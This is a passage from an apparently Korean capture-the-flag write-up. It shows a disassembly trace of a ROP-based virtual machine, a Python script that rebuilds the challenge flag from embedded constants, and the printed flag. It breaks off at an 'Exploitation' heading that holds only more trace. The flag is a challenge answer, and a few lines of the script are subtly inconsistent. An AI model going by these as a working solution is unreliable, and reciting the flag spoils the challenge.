</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x347892d8</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdx</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">880317224</span> ; <span style="color:#a6e22e">r12</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x347892f0</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">if</span> <span style="color:#66d9ef">true</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x34789328</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3478a218</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x347892f8</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdx</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> ; <span style="color:#a6e22e">r12</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">4294967295</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34789310</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdx</span> <span style="color:#f92672">|=</span> <span style="color:#a6e22e">rax</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34789318</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rsp</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">rdx</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34789320</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">invalid</span> <span style="color:#a6e22e">ops</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34789328</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rsi</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">93966797856896</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34789338</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdi</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1095002458</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34789348</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">xchg</span> <span style="color:#a6e22e">edi</span>, <span style="color:#a6e22e">eax</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34789350</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">&gt;&gt;=</span> <span style="color:#ae81ff">6</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34789358</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">&gt;&gt;=</span> <span style="color:#ae81ff">6</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34789360</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">&gt;&gt;=</span> <span style="color:#ae81ff">6</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34789368</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">&gt;&gt;=</span> <span style="color:#ae81ff">6</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34789370</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">xchg</span> <span style="color:#a6e22e">edi</span>, <span style="color:#a6e22e">eax</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34789378</span><span style="color:#f92672">:</span> (<span style="color:#a6e22e">QWORD</span>)(<span style="color:#a6e22e">var_5576599b6080</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">1095002458</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34789380</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdi</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34789390</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdx</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> ; <span style="color:#a6e22e">r12</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x347893a8</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x347893b8</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">sys_write</span>(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0x5576599b6080</span>, <span style="color:#ae81ff">1</span>) <span style="color:#75715e">// &#34;\n&#34;
</span></span></span></code></pre></div><p>리버싱같은 경우에는 마지막에 검증 로직이 한글자씩 박혀있어서 이를 연산하면 구할 수 있다.</p>
<h3 id="rev-sol-script">Rev sol script<a hidden class="anchor" aria-hidden="true" href="#rev-sol-script">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#a6e22e">def</span> <span style="color:#a6e22e">encode</span>(<span style="color:#a6e22e">input</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">output</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">table</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">padding</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">input</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">input</span>.<span style="color:#a6e22e">encode</span>()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">range</span>(<span style="color:#a6e22e">len</span>(<span style="color:#a6e22e">input</span>)<span style="color:#75715e">//3):
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">r</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">input</span>[<span style="color:#a6e22e">i</span><span style="color:#f92672">*</span><span style="color:#ae81ff">3</span><span style="color:#f92672">:</span><span style="color:#a6e22e">i</span><span style="color:#f92672">*</span><span style="color:#ae81ff">3</span><span style="color:#f92672">+</span><span style="color:#ae81ff">3</span>]
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">tmp</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">r</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">16</span>) <span style="color:#f92672">|</span> (<span style="color:#a6e22e">r</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">|</span> (<span style="color:#a6e22e">r</span>[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">j</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">range</span>(<span style="color:#ae81ff">3</span>,<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>,<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">output</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">table</span>[(<span style="color:#a6e22e">tmp</span><span style="color:#f92672">&gt;&gt;</span>(<span style="color:#ae81ff">6</span><span style="color:#f92672">*</span><span style="color:#a6e22e">j</span>))<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">63</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">output</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">padding</span>[<span style="color:#a6e22e">len</span>(<span style="color:#a6e22e">input</span>)<span style="color:#f92672">:</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">output</span> 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">encode</span>(<span style="color:#e6db74">&#39;ABCABCABC&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">AUTH</span> <span style="color:#a6e22e">START</span> <span style="color:#ae81ff">0x34786168</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FLAG</span> <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">range</span>(<span style="color:#ae81ff">100</span>)]
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">160</span> <span style="color:#75715e">// 2
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">320</span> <span style="color:#75715e">// 2 // 2
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x27800000</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x17</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">3926177678</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">6</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">6</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">&amp;=</span> <span style="color:#ae81ff">0xff</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">260</span> <span style="color:#75715e">//2 //2
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">=</span> (<span style="color:#ae81ff">1039200116</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">4286578688</span>) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x17</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">684128790</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">6</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">6</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">&amp;=</span> <span style="color:#ae81ff">0xff</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">7</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">428</span><span style="color:#75715e">//2//2
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">=</span> (<span style="color:#ae81ff">4286578688</span><span style="color:#f92672">&amp;</span><span style="color:#ae81ff">799156286</span>) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x17</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">9</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1578560217</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">6</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">6</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">9</span>] <span style="color:#f92672">&amp;=</span> <span style="color:#ae81ff">0xff</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">10</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">444</span><span style="color:#75715e">//2 //2
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">11</span>] <span style="color:#f92672">=</span> (<span style="color:#ae81ff">1002022558</span><span style="color:#f92672">&amp;</span><span style="color:#ae81ff">4286578688</span>) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x17</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">12</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">2256925353</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">6</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">6</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">12</span>] <span style="color:#f92672">&amp;=</span> <span style="color:#ae81ff">0xff</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">13</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">444</span> <span style="color:#75715e">// 2 // 2
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">14</span>] <span style="color:#f92672">=</span> (<span style="color:#ae81ff">941616977</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">4286578688</span>) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x17</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">15</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">3418772988</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">6</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">6</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">16</span>] <span style="color:#f92672">&amp;=</span> <span style="color:#ae81ff">0xff</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">17</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">440</span> <span style="color:#75715e">// 2// 2
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">18</span>] <span style="color:#f92672">=</span> (<span style="color:#ae81ff">797988891</span><span style="color:#f92672">&amp;</span><span style="color:#ae81ff">4286578688</span>) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x17</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">19</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1995915979</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">6</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">6</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">19</span>] <span style="color:#f92672">&amp;=</span> <span style="color:#ae81ff">0xff</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">20</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">416</span> <span style="color:#75715e">// 2// 2
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">21</span>] <span style="color:#f92672">=</span> (<span style="color:#ae81ff">848734036</span><span style="color:#f92672">&amp;</span><span style="color:#ae81ff">4286578688</span>) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x17</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">22</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">3608542792</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">6</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">6</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">22</span>] <span style="color:#f92672">&amp;=</span> <span style="color:#ae81ff">0xff</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">23</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">412</span> <span style="color:#75715e">// 2// 2
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">24</span>] <span style="color:#f92672">=</span> (<span style="color:#ae81ff">4286578688</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">816513309</span>) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x17</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">25</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">3969338450</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">6</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">6</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">25</span>] <span style="color:#f92672">&amp;=</span> <span style="color:#ae81ff">0xff</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">26</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">404</span> <span style="color:#75715e">// 2//2
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">27</span>] <span style="color:#f92672">=</span> (<span style="color:#ae81ff">802522653</span><span style="color:#f92672">&amp;</span><span style="color:#ae81ff">4286578688</span>) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x17</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">28</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">3063290591</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">6</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">6</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">29</span>] <span style="color:#f92672">&amp;=</span> <span style="color:#ae81ff">0xff</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">30</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">440</span> <span style="color:#75715e">//2 //2
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">31</span>] <span style="color:#f92672">=</span> (<span style="color:#ae81ff">843560064</span><span style="color:#f92672">&amp;</span><span style="color:#ae81ff">4286578688</span>) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x17</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">32</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">2364930504</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">6</span> <span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">6</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">32</span>] <span style="color:#f92672">&amp;=</span> <span style="color:#ae81ff">0xff</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">33</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">428</span> <span style="color:#75715e">// 2//2
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">34</span>] <span style="color:#f92672">=</span> (<span style="color:#ae81ff">883494366</span><span style="color:#f92672">&amp;</span><span style="color:#ae81ff">4286578688</span>) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x17</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">35</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">927384544</span><span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">6</span><span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">6</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">35</span>] <span style="color:#f92672">&amp;=</span> <span style="color:#ae81ff">0xff</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">36</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">432</span> <span style="color:#75715e">// 2 // 2
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">37</span>] <span style="color:#f92672">=</span> (<span style="color:#ae81ff">805135607</span><span style="color:#f92672">&amp;</span><span style="color:#ae81ff">4286578688</span>) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x17</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">38</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">2395425389</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">6</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">6</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">39</span>] <span style="color:#f92672">&amp;=</span> <span style="color:#ae81ff">0xff</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">40</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">416</span> <span style="color:#75715e">// 2// 2
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">41</span>] <span style="color:#f92672">=</span> (<span style="color:#ae81ff">851439545</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">4286578688</span>) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x17</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">42</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">4091936035</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">6</span><span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">6</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">42</span>] <span style="color:#f92672">&amp;=</span><span style="color:#ae81ff">0xff</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">43</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">400</span><span style="color:#75715e">//2//2
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">44</span>] <span style="color:#f92672">=</span> (<span style="color:#ae81ff">888487573</span><span style="color:#f92672">&amp;</span><span style="color:#ae81ff">4286578688</span>) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x17</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">45</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">414588904</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">6</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">6</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">45</span>] <span style="color:#f92672">&amp;=</span> <span style="color:#ae81ff">0xff</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">46</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">392</span> <span style="color:#75715e">//2 //2
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">47</span>] <span style="color:#f92672">=</span> (<span style="color:#ae81ff">912316478</span><span style="color:#f92672">&amp;</span><span style="color:#ae81ff">286578688</span>) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x17</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">48</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1699151259</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">6</span><span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">6</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FLAG</span>[<span style="color:#ae81ff">48</span>] <span style="color:#f92672">&amp;=</span> <span style="color:#ae81ff">0xff</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">FLAG</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">chr</span>(<span style="color:#a6e22e">i</span>),<span style="color:#a6e22e">end</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">POKA</span>{<span style="color:#a6e22e">ok_now_open_the_gate_and_kill_the_diablo</span>}
</span></span></code></pre></div><h2 id="exploitation-3">Exploitation<a hidden class="anchor" aria-hidden="true" href="#exploitation-3">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#ae81ff">0x347853c0</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rsp</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">rdx</span> <span style="color:#75715e">// rsp = main+0x70 // back to menu
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">--------</span> <span style="color:#a6e22e">print</span>() <span style="color:#f92672">---------</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x347853c8</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">880321056</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x347853d8</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">inc</span> <span style="color:#a6e22e">idx</span> ; <span style="color:#a6e22e">stack</span>[<span style="color:#a6e22e">idx</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">rsp</span> ; <span style="color:#a6e22e">rsp</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3478a220</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x347853e0</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdx</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">880300912</span> ; <span style="color:#a6e22e">r12</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x347853f8</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rsp</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">rdx</span> <span style="color:#75715e">// rsp = main+0x70 // back to menu
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">--------</span> <span style="color:#a6e22e">exit</span>() <span style="color:#f92672">---------</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34785400</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">880301120</span>
